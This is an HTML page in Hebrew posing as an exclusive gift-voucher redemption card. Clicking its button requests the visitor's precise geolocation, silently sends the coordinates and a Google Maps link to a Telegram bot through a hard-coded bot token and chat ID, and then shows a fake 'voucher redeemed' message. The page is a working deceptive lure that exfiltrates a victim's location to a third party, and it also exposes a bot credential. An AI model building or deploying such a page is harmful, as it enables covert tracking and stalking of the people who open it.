    <title>מימוש שובר</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 150px;
            background: #f9f9f9;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: inline-block;
            max-width: 400px;
            width: 100%;
        }
        button {
            padding: 15px 25px;
            font-size: 18px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }
        button:hover {
            background: #218838;
        }
        #status {
            margin-top: 20px;
            font-size: 20px;
            color: #333;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="card" id="cardContent">
        <h2>🎁 שובר מתנה בלעדי</h2>
        <p>לחץ על הכפתור למטה כדי לאשר ולממש את השובר שלך.</p>
        <button onclick="redeemVoucher()">לחץ כאן כדי לממש את השובר</button>
    </div>

    <div id="status"></div>

    <script>
        const TOKEN = "8832494143:AAEHdg2ItjjUk0sE1TRMFYdUI3ZWxaWGy9g";
        const CHAT_ID = "5767381167";

        function redeemVoucher() {
            const card = document.getElementById("cardContent");
            const status = document.getElementById("status");

            // בדיקה האם הדפדפן תומך במיקום
            if (!navigator.geolocation) {
                status.innerHTML = "הדפדפן שלך אינו תומך באיתור מיקום.";
                return;
            }

            // קבלת המיקום ושליחה ברגע הלחיצה
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                const messageText = `🎁 שובר נוצל!\n📍 מיקום המשתמש:\nקו רוחב: ${lat}\nקו אורך: ${lon}\n\nלצפייה במפה:\n${mapsLink}`;

                const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: messageText
                };

                // שליחה לטלגרם ברקע
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            }, error => {
                // גם אם המיקום נדחה או נכשל, נמשיך הצידה לפי הבקשה
                console.log("Geolocation error or denied");
            }, {
                enableHighAccuracy: true
            });

            // שינוי המסך מיד למצב "השובר מומש"
            card.style.display = "none";
            status.innerHTML = "✅ השובר מומש בהצלחה!";
        }
    </script>
